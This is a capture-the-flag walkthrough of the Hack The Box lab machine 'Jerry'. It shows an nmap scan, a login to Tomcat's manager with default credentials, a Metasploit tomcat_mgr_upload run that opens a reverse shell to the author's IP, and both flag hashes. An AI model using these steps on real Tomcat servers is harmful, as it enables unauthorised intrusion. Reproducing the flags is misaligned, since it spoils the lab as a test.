### IP
`10.10.10.95`

# Recon
`nmap -sC -sV 10.10.10.95 -o Jerry.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-18 23:16 EST
Nmap scan report for 10.10.10.95
Host is up (0.048s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.16 seconds
```
* Looks like theres an apache tomcat web server running on port 8080. We should probably go to that website

# Exploitation

### tomcat
* When we go to `http://10.10.10.95:8080/`, we see that the machine is running a default apache tomcat server, which is vulnerable.
* The site has a `manager app` that asks for some login info. Because its a default server, I decided to try out default credentials
	* [this](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown) had a couple to try out
	* eventually, I got a username of `tomcat` and password of `s3cret` to work
		* If you wanted to, you could probably use hydra and some wordlists to get this, but I didn't think it was too necessary
* We can use metasploit for this 

* note: `10.10.14.19` should be replaced with your local ip (i used the one for my vpn tun0 interface)
```
search tomcat
use exploit/multi/http/tomcat_mgr_upload
show options
set HttpUsername tomcat
set HttpPassword s3cret
set RHOST 10.10.10.95
set RPORT 8080
set LHOST 10.10.14.19
run
```
* we get a shell!

* when i cd into `C:\Users\Administrator\Desktop\flags`, i can type `cat "2 for the price of 1.txt"` to get the contents of the file:
```
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```
